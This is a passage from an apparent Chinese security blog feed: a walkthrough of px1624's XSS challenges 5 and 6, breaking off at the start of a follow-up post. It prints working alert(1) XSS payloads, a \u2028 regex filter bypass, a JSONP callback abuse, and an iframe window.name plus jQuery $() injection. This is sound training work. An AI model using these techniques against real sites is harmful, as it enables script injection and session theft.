class="line">&#125;,</span><br></pre></td></tr></table></figure><p>看完之后我们大致就可以清楚为什么我们直接访问会进行跳转：我们没有传入uin参数，那么获取到的orguin就是<code>&quot;&quot;</code>，在js中<code>&quot;&quot;==0</code>成立，满足<code>&quot;&quot;&lt;=0</code>，于是跳转。</p><p>那么第一步我们需要让他不跳转，来进行js调试，根据原理访问<code>http://px1624.sinaapp.com/test/xsstest5/?uin=123</code>即可。而<code>http://px1624.sinaapp.com/test/xsstest5/?uin=123#</code>就不行，他会去截取#之后的字符去解析。</p><p>回归payload触发，我们要在script标签中引入一个带有js的页面，我第一反应是直接引入之前成功弹框的页面，比如test4：<code>http://px1624.sinaapp.com/test/xsstest4/?px=%27;反引号;{alert(%27</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;script type="text/javascript" src="http://px1624.sinaapp.com/'</span>+orguin+<span class="string">'?'</span>+pagenum+<span class="string">'"&gt;&lt;\/script&gt;'</span>);</span><br></pre></td></tr></table></figure><p>按照对应的拼接规则来构造payload：<code>http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest4/&amp;pn=px=%27;反引号;{alert(%27*</code>。然后就发现不行，原因有二：</p><ul><li>根本思路错误：在本地测试利用script标签在src引入test4的带有js的页面也不会成功弹框，因为test4弹框的页面不单单只有js代码，还有html代码，这里会解析错误。</li><li>我们构造的payload被破坏：根据js解析规则我们构造的payload其中的%会被吃掉。</li></ul><p>更换思路，我们不能使用带有html标签的页面，而是要在对方服务器上找到一个仅仅存在js payload的页面，来引入执行。（根据题目中的url拼接规律是不可以引入其他域名的页面的，只有这种方法可以）</p><p>想到之前我们给啥他返回啥，但是由于内容头不解析的<strong>user.php</strong>，通过callback指定返回内容：</p><p><a href="http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)</a></p><p>根据拼接规则构造payload，会发现这种思路构造的payload恰好绕过了Tjs_Get的两个waf过滤:</p><p><code>http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</code></p><p>当然根据js代码中获取<code>Tjs_Get</code>不同的规则，还可以获取锚点中的参数，对应writeup：</p><p><code>http://px1624.sinaapp.com/test/xsstest5/#uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</code></p><h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest6/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest6/</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script src=<span class="string">"../jquery-3.4.1.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;Script src=<span class="string">"./index.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> orguin = $.Tjs_Get(<span class="string">'uin'</span>);</span><br><span class="line"><span class="keyword">if</span>(orguin&lt;=<span class="number">0</span>) <span class="built_in">window</span>.location=<span class="string">"./user.php?callback="</span>;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;script type="text/javascript" src="http://px1624.sinaapp.com/pxpath/'</span>+<span class="built_in">decodeURIComponent</span>(orguin)+<span class="string">'&amp;'</span>+<span class="built_in">Math</span>.random()+<span class="string">'"&gt;&lt;\/script&gt;'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Give me xss bypass <span class="number">6</span>~【任意浏览器弹<span class="number">1</span>就算通过】</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li>正则表达式<code>.</code>匹配范畴</li><li>浏览器处理字符集的情况</li><li>JS正则匹配的匹配逻辑</li><li>window.name跨域传输参数</li><li>延续第二题分析的JQuery DOM XSS的特性</li></ul><p>跟第五题看上去区别不大，index.js中的内容也没有变化，其他有三处变化：</p><ul><li>之前2处参数前端参数输入自动用? 连接 变为了 一处参数插入，之后加了个应该没用&amp;和随机数</li><li>输入的参数用了decodeURLComponent解密后拼接</li><li>进入了一个<code>/pxpath/</code>的不存在的子目录，看样子需要<code>../</code>去回到上层目录才行</li></ul><p>回顾之前的<strong>Tjs_Get</strong>解析分析的结果：</p><ol><li>分情况解析?之后的参数或者是#之后的参数</li><li>waf1：<code>%</code>被过滤为空</li><li>waf2：包括<code>?</code>之前的字符会被清空不被解析（经过测试为贪婪匹配即最后一个?为准）</li><li>假如出现两个相同的参数名的参数，根据实现逻辑会取第一个的值</li></ol><p>这里尝试跟上一题一样构建payload的话就会发现我们必须跟<code>%</code>、<code>?</code>这两个waf杠上，因为我们引入的script标签src来源payload所在地：<code>http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)</code>就是有一个<code>?</code>。</p><p>按照waf2规则，如果我们使用<code>?</code>，之前的内容就会被丢弃；如果尝试对<code>?</code>进行url编码（因为最后拼接前有一个decodeURLComponent url解码，可以恢复出我们的<code>?</code>）就会因为在读取参数的时候<code>%</code>被删掉而失败。</p><p>那么只有两个思路：</p><ol><li>仍然使用user.php?callback的payload触发页面，然后想办法硬肛WAF来绕过</li><li>使用一个没有？的payload触发页面</li></ol><p>由于域名的限定，当前域名没有符合第二个思路的条件：于是使用一个没有？的payload触发页面的思路，就PASS。</p><p>还是来硬肛WAF，两个WAF都是由正则匹配的：</p><ul><li><code>str.replace(/%/g,&quot;&quot;);</code></li><li><code>str.replace(/.*\?/,&quot;&quot;)</code></li></ul><p>前者加上了g修饰符完成全局匹配<code>%</code>，确实没法绕过；看后者实现的逻辑为：<strong>0个或多个除了换行符以外的字符再加上一个？</strong>会被替换为空。</p><ul><li><code>.</code>：除了换行符以外的字符</li><li><code>*</code>：一次或多次</li><li><code>\?</code>：一个?字符</li></ul><p>可以注意到他只匹配<strong>除换行符以外的字符</strong>加一个问号，那么<strong>插入一个换行符</strong>是不是就可以破坏他的匹配规则？</p><p>先给出两种不考虑waf情况的理论poc（js中的参数形式与锚点形式）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">参数形式：<span class="string">"http://px1624.sinaapp.com/test/xsstest6/?uin=../test/xsstest5/user.php?callback=alert(1)"</span></span><br><span class="line"><span class="comment">//在js处理中会取location.search.substr(1),即：</span></span><br><span class="line">uin=../test/xsstest5/user.php?callback=alert(<span class="number">1</span>)</span><br><span class="line">锚点形式：<span class="string">"http://px1624.sinaapp.com/test/xsstest6/#uin=../test/xsstest5/user.php?callback=alert(1)"</span></span><br><span class="line"><span class="comment">//在js处理中会取location.hash.substr(1),即：</span></span><br><span class="line">uin=../test/xsstest5/user.php?callback=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>可以概括进入<code>str.replace(/.*\?/,&quot;&quot;)</code>的str目前为<code>123?456</code>的格式，并且这个<code>123?456</code>是不能被删掉的全都要的数据。</p><p>我们知道常见的换行符有<code>/r、/n</code>，我们来到到谷歌浏览器命令行试验一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"123?456"</span>.replace(<span class="regexp">/.*\?/</span>,<span class="string">""</span>)</span><br><span class="line"><span class="comment">//"456"(匹配到了"123?"")</span></span><br><span class="line"><span class="string">"123\r?456"</span>.replace(<span class="regexp">/.*\?/</span>,<span class="string">""</span>)</span><br><span class="line"><span class="comment">//"123456"(匹配到了"?",123\456中间有一个看不见的/r)</span></span><br><span class="line"><span class="comment">//可以发现利用换行符的确可以截断</span></span><br><span class="line"><span class="comment">//此外总会死一个?，需要引入一个替死鬼</span></span><br><span class="line"><span class="string">"?123\r?456"</span>.replace(<span class="regexp">/.*\?/</span>,<span class="string">""</span>)</span><br><span class="line"><span class="comment">//"123?456"(匹配到了第一个"?"，中间有一个看不见的/r)</span></span><br><span class="line"><span class="comment">//这里涉及到为哈不匹配第二个"?"呢，因为他们都满足条件正则条件</span></span><br><span class="line"><span class="comment">//这种情况在JS中就会匹配第一个符合条件的。</span></span><br></pre></td></tr></table></figure><p>来带入到具体数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uin=../test/xsstest5/user.php?callback=alert(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//加上我们说的开头的替死鬼?</span></span><br><span class="line">?uin=../test/xsstest5/user.php?callback=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>再来确定换行符应该放的位置，我们会发现好像不是能够随便放置的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?\ruin=../test/xsstest5/user.php?callback=alert(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//不行，这样的话会改变参数名称导致之后解析获取不到uin</span></span><br><span class="line">?uin=\r../test/xsstest5/user.php?callback=alert(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//不行，目录跳转的上层目录应该会解析出错</span></span><br></pre></td></tr></table></figure><p>根据<strong>参数解析规则</strong>和<strong>目录跳转特征</strong>，我们会得出两种理论可能可行的方案：</p><ul><li><p>作为一个不使用的参数：<code>?\r&amp;uin=../test/xsstest5/user.php?callback=alert(1)</code></p></li><li><p>作为一个子目录再跳上来：<code>?uin=\r/../../test/xsstest5/user.php?callback=alert(1)</code></p></li></ul><p>很好，然后构造出2种最后的理论可行完整payload地址：</p><p><code>http://px1624.sinaapp.com/test/xsstest6/??\r&amp;uin=../test/xsstest5/user.php?callback=alert(1)</code></p><p><code>http://px1624.sinaapp.com/test/xsstest6/??uin=\r/../../test/xsstest5/user.php?callback=alert(1)</code></p><blockquote><p>可以看到有2个？</p><p>第一个？会被location.search.substr(1)吞掉，第二个？是为了被正则匹配吃掉</p><p>第一个？换成#就是换成了锚点读取参数的方式，即再js逻辑中location.search -&gt; location.hash</p></blockquote><p>丢谷歌浏览器地址栏去尝试，会发现GG，在index.js中下断点发现<code>\r</code>会被当作是普通字符串解析。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui4s4ripj32240y7dpp.jpg" alt="r的失败.png"></p><p>这将导致我们一切推导的前提：<strong>换行符能够破坏<code>/.*\?/</code>的正则匹配</strong>被抽空掉。</p><ol><li>编码补救？在地址栏的编码中能使用URL式的编码，会产生无法绕过的WAF1拦截的<code>%</code>，不行</li><li>尝试使用控制台解析跳转：location=url地址。（因为我们之前测试在控制台中是可以解析的，这样既可以完成字符解析又可以完成在地址栏中输入一样跳转地址的效果）（ps.当然这种骚操作的引入在利用场景上就会离简单的XSS利用—点击恶意连接利用不一样了）</li></ol><p>题目提示任意浏览器均可肯定有的不行，控制台分别都试下：<code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??\r&amp;uin=../test/xsstest5/user.php?callback=alert(1)&quot;</code></p><p>在谷歌和火狐浏览器中会被直接吞掉：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui54tandj31xj0r6ahz.jpg" alt="location-r的失败.png"></p><p>在IE浏览器会正常解析<code>\r</code>，然后吞掉：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui5ck27wj30o809uq41.jpg" alt="IE-location-r的失败.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui5l4zeuj320t0npn1u.jpg" alt="IE-location-r的失败2.png"></p><p>不得行。换行符换行符，那就换个换行符<code>\n</code>？肯定还是一样的局面。</p><h3 id="正则-不匹配的字符到底有啥"><a href="#正则-不匹配的字符到底有啥" class="headerlink" title="正则 . 不匹配的字符到底有啥"></a>正则 . 不匹配的字符到底有啥</h3><p>看到这里<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions" target="_blank" rel="noopener">字符集的参考文档</a>:</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui5yn1nhj31kn0hg77q.jpg" alt="换行符字符集.png"></p><p>结合<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions" target="_blank" rel="noopener">正则的参考文档</a>:</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui6319gwj31py09oq5d.jpg" alt="换行符字符集2.png"></p><p>使用<code>&quot;123?\u2028456?&quot;.replace(/.*\?/,&quot;&quot;)</code>进行一个个测试：</p><p>发现<code>\n、\r、\u2028、\u2029</code>可以拦截<code>.</code>的匹配（ps.空白字符串没有给到惊喜….）</p><p>那么\r、\n不行，试试<strong>\u2028</strong>和<strong>\u2029</strong></p><p>取IE为例（因为要是浏览器有问题一般肯定是IE有问题，Edge也可），地址栏中直接<code>http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest5/user.php?callback=alert(1)</code>理所应当还是会被作为字符串。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui6bv6gzj321i0t2djw.jpg" alt="IE-地址栏-2028.png"></p><p>控制台执行location呢：<code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest5/user.php?callback=alert(1)&quot;</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui78qkc6j31rt0loq74.jpg" alt="IE-location-2028.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui7c833dj31gv0ic0t0.jpg" alt="IE-location-2028-success.png"></p><p>完美解析弹框。我们的/u2028被解析成了一个字符传入。</p><p>来看看其他浏览器，比如火狐，我们的/u2028会被解析成URL形式，然后被WAF1干掉%，谷歌也是一样的，GG：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui7i4tp4j31w00vrwma.jpg" alt="火狐-false-2028.png"></p><p>此外，这边之前说到的<strong>当作子目录形式</strong>的payload也是可以的：</p><p><code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??uin=\u2028/../../test/xsstest5/user.php?callback=alert(1)&quot;</code></p><p>所以2种最后writeup：</p><p><code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest5/user.php?callback=alert(1)&quot;</code></p><p><code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??uin=\u2028/../../test/xsstest5/user.php?callback=alert(1)&quot;</code></p><ul><li>第一个<code>?</code>可以替换为<code>#</code>，变为锚点形式的取参</li><li>\u2028 可以换成 \u2029</li></ul><h3 id="test6作为触发器"><a href="#test6作为触发器" class="headerlink" title="test6作为触发器-$()"></a>test6作为触发器-$()</h3><p>其实以上payload都使用了上一题的<strong>/xsstest5/user.php</strong>作为payload触发。</p><p>如果要用<strong>xsstest6/user.php</strong>作为触发器又会有另外一个问题：<strong>这个页面callback参数限制值7个字符</strong></p><p>即：只能写alert()，不能写alert(1)</p><p>我们要想办法弄一个短一点的弹框payload。</p><p>在这之前我们要梳理一下第六题location的攻击场景：使用location=payload的形式，并不是说真的要让受害者去命令行中执行这一js代码去触发弹框。而是攻击者会构筑一个网站，在其中写入自定义js代码，执行location跳转触发弹框。</p><ul><li>受害者点击攻击者自定义网站域名</li><li>跳转至漏洞网站，完成攻击</li></ul><p>比如之前的payload，可以形成这样一个123.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    location=<span class="string">"http://px1624.sinaapp.com/test/xsstest6/??uin=\u2028/../../test/xsstest5/user.php?callback=alert(1)"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后用Edge打开页面（模拟访问服务器页面）就可以自动跳转触发。</p><p>回到使用xsstest6：其实利用原理<strong>JQuery $() DOM XSS特性</strong>在第二题中已经详细的分析了，就是<code>$(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)</code>可以作为alert(1)的弹框替代，我们只要把img标签设置成一个变量就可以达到缩短长度的目的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span></span><br><span class="line">$(a)</span><br></pre></td></tr></table></figure><p>想构建一个payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="xml">var a="<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>"</span></span><br><span class="line"><span class="javascript">    location=<span class="string">"http://px1624.sinaapp.com/test/xsstest6/??uin=\u2028/../../test/xsstest5/user.php?callback=$(a)"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不用试就知道显而易见不可以，因为location会进行跳转，跳转过去的页面，在处理时，我们的a参数直接就没了。</p><p>然后还需要重申一个点：我们的callback参数的内容是一段会在px1624.sinaapp.com域下进行执行的js代码。</p><p>而px1624.sinaapp.com/test/xsstest6/这个页面下的js环境中又没有我们要的payload：<code>&quot;&lt;img src=x onerror=alert(1)&gt;&quot;</code></p><p>这就明确了目标：</p><ol><li>我们需要往px1624.sinaapp.com域下传入一个payload参数。</li><li>然后通过callback后面的js执行<code>$()</code>这个参数。</li></ol><p>于是<strong>windows.name跨域传输参数</strong></p><h4 id="iframe的window-name跨域传输"><a href="#iframe的window-name跨域传输" class="headerlink" title="iframe的window.name跨域传输"></a>iframe的window.name跨域传输</h4><blockquote><p>感谢Huuu师父忍受了憨批错误的骚扰和指出了此处的技术原理</p></blockquote><p>iframe内外，可以通过window.name进行传输参数，<a href="https://developer.aliyun.com/article/293802" target="_blank" rel="noopener">参考</a>，此处举个例子</p><p><code>iframe-a.html</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"px"</span> <span class="attr">name</span>=<span class="string">"**from-a-name**"</span> <span class="attr">src</span>=<span class="string">"./iframe-b.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>iframe-b.html</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"b-name-output:"</span>+name)</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"b-window.name-output:"</span>+<span class="built_in">window</span>.name)</span></span><br><span class="line"><span class="javascript">    name=<span class="string">"b-name-change"</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name=<span class="string">"b-window.name-change"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui7p9683j30tc0o276k.jpg" alt="iframe-name跨域.png"></p><p>可以见的：</p><ul><li>父页面A可以通过 设置iframe的name属性 向子页面B传输数据，并且被在子页面中使用<strong>name</strong>/<strong>window.name</strong>获取到</li><li>子页面B可以通过 设置window.name 向父页面A传输数据，并且在父页面中使用<strong>节点.contentWindow.name</strong>获取到</li></ul><blockquote><p>如果只是放在桌面上打开，而本地不起web服务放入这两个文件，会爆这个错误：<a href="https://blog.csdn.net/qq_35603476/article/details/100918772" target="_blank" rel="noopener">Blocked a frame with origin “null” from accessing a cross-origin frame.</a></p></blockquote><p>那么至此就很明显了：弄一个iframe，在name里传入我们的payload，然后$()它即可。</p><p>当然在callback值中由于长度问题，不能使用<code>$(window.name)</code>，使用<code>$(name)</code>长度刚好，writeup：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"px"</span> <span class="attr">name</span>=<span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">"px"</span>).src=<span class="string">"http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest6/user.php?callback=$(name)"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用Edge、或者IE打开均可。</p><h4 id="px1642的拷问"><a href="#px1642的拷问" class="headerlink" title="px1642的拷问"></a>px1642的拷问</h4><p>在和大哥提到题目的时候，被指着文章进行无情的鞭挞QAQ，由于做了挺久了，问了几个问题一个都回答不好，害。</p><ol><li>为什么如上payload中，iframe标签的name属性由<code>&lt;img src=x onerror=alert(1)&gt;</code>修改为<code>alert(1)</code>不可以弹框呢？</li></ol><p>其实题目的最终是将callback后面的参数值作为JS解析执行。修改了name，最终执行的JS就为：<code>$(&quot;alert(1)&quot;)</code></p><p>在第二题中详细分析过JQuery的DOM XSS特性，是由于DOM操作插入标签引起的。但是当时一开始迷惑于，测试<code>$(alert(1))</code>是可以弹框的，那为什么通过name拆开了alert(1)就不可以弹框了呢，死活想不通。</p><p>实际上<code>$(alert(1))</code>和<code>$(&quot;alert(1)&quot;)</code>完全不是一回事情，前者弹框是由于先进行表达式计算，后进入$()，才弹框的。后者这种形式本来就不能执行。</p><ol start="2"><li>为什么如下payload，不可以弹框呢</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"px"</span> <span class="attr">name</span>=<span class="string">"javascript:alert(1)"</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">"px"</span>).src=<span class="string">"http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest6/user.php?callback=name"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其实这里就是把各种东西杂揉了进来，看起来好像很有道理，但是根本不沾边。</p><p>回归题目最终是将callback后面的参数值作为JS解析执行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">"javascript:alert(1)"</span>;</span><br><span class="line">name;</span><br></pre></td></tr></table></figure><p>只不过区区变量而已，当然不弹框。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/MNP1PW0bi0aL7dRr1aa2Tg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/MNP1PW0bi0aL7dRr1aa2Tg</a><br><a href="https://mp.weixin.qq.com/s/T44dQckTjc0M1loRzTRH0A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/T44dQckTjc0M1loRzTRH0A</a><br><a href="https://mp.weixin.qq.com/s/jx-UWFfSPOVPhWLsvGxPcw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/jx-UWFfSPOVPhWLsvGxPcw</a><br><a href="https://mp.weixin.qq.com/s/Q976z2ryfkEJQiSyl8aH8g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Q976z2ryfkEJQiSyl8aH8g</a><br><a href="https://mp.weixin.qq.com/s/Nxjn_SUAfrB-K5z6YdlW8g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Nxjn_SUAfrB-K5z6YdlW8g</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间看到了px1624的10题XSS案例，一直留着留着，终于拿出来看看了。还好网站没关。(现在已经变成了12题)&lt;/p&gt;
&lt;p&gt;觉得是一
      
    
    </summary>
    
    
      <category term="web,XSS" scheme="http://lalajun.com/tags/web-XSS/"/>
    
  </entry>
  
  <entry>
    <title>十二个XSS案例重新认识XSS-下</title>
    <link href="http://lalajun.com/2020/11/18/%E5%8D%81%E4%BA%8C%E4%B8%AAXSS%E6%A1%88%E4%BE%8B%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86XSS-%E4%B8%8B/"/>
    <id>http://lalajun.com/2020/11/18/十二个XSS案例重新认识XSS-下/</id>
    <published>2020-11-18T09:05:33.000Z</published>
    <updated>2020-11-23T08:48:09.620Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间看到了px1624的10题XSS案例，一直留着留着，终于拿出来看看了。还好网站没关。（然后突然增加了2题变成了12题了）</p><p>觉得是一个JS基础不是很好的菜鸡补充了解一些JS基础和奇怪姿势的很好的案例，此文包含7-12题(共9k6字)，知识点大概包括：</p><ul><li>当在字符串过滤中使用<code>\</code>的绕过方式</li><li><code>&lt;!-- &lt;script&gt;</code>可以突破<code>&lt;/script&gt;</code>标签的限制</li><li>浏览器对于<code>&lt;script/&gt;</code>不解析为标签，但是<code>&lt;script /&gt;</code>一类的可以正常解析</li><li>浏览器对于JS无分号换行的处理方式</li><li><code>&lt;!-- &lt;script&gt;</code>可以多次突破<code>&lt;/script&gt;</code>标签的限制</li><li><code>&lt;script&gt;</code>标签之间互相不管死活</li><li>模板字符串的嵌套</li><li>闭合大括号的方式：对象等</li><li>使用%2f让浏览器不会吞掉多余路径</li><li>JS语言声明变量时<strong>变量提升</strong>的特性</li><li>var的另一种赋值方式：<strong>解构赋值</strong></li></ul><p>对于以上列出知识点如果只有个别不清楚的，可以直接在各题知识点中找到它，然后看那一题就行了。但是后6题跟前6题有点不一样，前六题可能是你看了知识点，就会恍然大悟：“原来是这样！我会了！”，但是后六题可能就是看了知识点：“原来是这样！”，但是还是做不来。</p><blockquote><p>此外还提出了第十题比已有解法更短的payload，以及官方WP暂未发布的第十一题、第十二题的WP。</p></blockquote><p>px1624的官方WP，写的很好。但是以菜鸡的角度去看题目总会讲述到一些默认被跳过的但是又有点东西的细节，也做了一点衍生。写文章一向往细了写，结合了看可能也会有所帮助吧？</p><p>有错误喷就完事了。</p><blockquote><p>感谢px1624老哥的案例分享，十一题十二题原作者renwax23的案例分享</p><p>以及huuu老哥的十二题最短解</p></blockquote><h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest7/?px=123" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest7/?px=123</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'123'</span>;</span></span><br><span class="line"><span class="undefined"></span><span 